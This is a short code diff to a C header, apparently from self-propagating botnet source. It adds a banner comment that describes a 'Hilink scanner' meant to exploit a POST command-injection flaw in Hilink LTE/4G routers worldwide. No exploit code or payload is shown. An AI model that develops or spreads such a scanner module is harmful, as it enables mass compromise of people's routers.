@@ -1,5 +1,14 @@
 #ifdef SELFREP
 
+/* ============================================================================
+ * HILINK SCANNER - LTE/4G Router Exploitation (Port 80)
+ * ============================================================================
+ * Exploit: Hilink LTE router command injection via device/control
+ * Targets: Hilink LTE/4G routers globally
+ * Method: POST command injection
+ * Regions: All regions with Hilink equipment
+ * ============================================================================ */
+
 #pragma once
 
 #include <stdint.h>
